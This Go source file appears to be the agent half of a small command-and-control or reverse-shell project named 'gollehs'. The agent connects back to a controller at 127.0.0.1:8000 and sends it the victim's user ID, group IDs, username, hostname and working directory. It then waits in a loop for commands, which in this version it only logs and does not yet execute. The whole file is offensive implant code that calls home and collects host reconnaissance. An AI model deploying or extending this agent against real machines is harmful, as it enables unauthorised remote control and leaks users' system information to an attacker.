package main

import (
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"os/user"
	"time"

	"github.com/fatih/color"
	"github.com/s-christian/gollehs/lib/logger"
	"github.com/s-christian/gollehs/lib/utils"
	"github.com/s-christian/gollehs/types"
)

const (
	serverPort = "8000"

	ExitSuccess int = 1
)

var (
	serverIp, _  = net.ResolveIPAddr("ip4", "127.0.0.1")
	serverTcp, _ = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%s", serverIp.IP.String(), serverPort))

	statusError   = color.New(color.BgRed, color.FgBlack, color.BlinkRapid)
	statusWarning = color.New(color.BgYellow, color.FgBlack, color.Bold)
	statusDone    = color.New(color.BgGreen, color.FgHiWhite, color.Italic)
)

func main() {
	logger.Logf(logger.Info, "Agent connecting to %s\n", serverTcp.String())

	conn, err := net.DialTCP("tcp", nil, serverTcp)
	if err != nil {
		logger.Log(logger.Error, "Could not connect to server!")
		logger.LogError(err)
		return
	}

	defer func() {
		utils.Close(conn)
		statusWarning.Printf("Connection from %s closed\n", conn.RemoteAddr().String())
	}()

	logger.Log(logger.Info, "Connection established, sending environment information to server")

	// Populate AgentCallback struct with system and user data
	agentCallback := &types.AgentCallback{
		UID:      "<unknown>",
		GIDs:     []string{},
		Username: "<unknown>",
		Name:     "<unknown>",
		Hostname: "<unknown>",
		Cwd:      "<?>",
		Output:   "",
		ExitCode: ExitSuccess,
	}

	currentUser, err := user.Current()
	if err != nil {
		logger.Log(logger.Error, "Cannot get current user information")
		logger.LogError(err)
	} else {
		agentCallback.UID = currentUser.Uid
		groupIDs, err := currentUser.GroupIds()
		if err != nil {
			logger.Log(logger.Error, "Cannot retrieve groups IDs")
			logger.LogError(err)
		} else {
			agentCallback.GIDs = groupIDs
		}
		agentCallback.Username = currentUser.Username
		agentCallback.Name = currentUser.Name
	}

	hostname, err := os.Hostname()
	if err != nil {
		logger.Log(logger.Error, "Could not retrieve hostname")
		logger.LogError(err)
	} else {
		agentCallback.Hostname = hostname
	}

	cwd, err := os.Getwd()
	if err != nil {
		logger.Log(logger.Error, "Could not retrieve current working directory")
		logger.LogError(err)
	} else {
		agentCallback.Cwd = cwd
	}

	// Encode and send agent info
	encoder := gob.NewEncoder(conn)
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	err = encoder.Encode(agentCallback)
	if err != nil {
		statusWarning.Printf("WARNING: Could not send agent data | %s\n", err.Error())
	}

	statusDone.Println("Awaiting commands...")

	for {
		dataBuffer := make([]byte, 1024)

		numBytes, err := conn.Read(dataBuffer)
		if err != nil {
			statusError.Printf("No data read from %s, closing\n", conn.RemoteAddr().String())
			logger.LogError(err)
			return
		}

		logger.Logf(logger.Debug, "Command is: '%s'\n", string(dataBuffer))

		// Shouldn't ever technically be greater than, but adding just in case
		if numBytes >= len(dataBuffer) {
			statusWarning.Println("Buffer is at maximum capacity, expect data to have been lost in transmission")
		}
	}
}
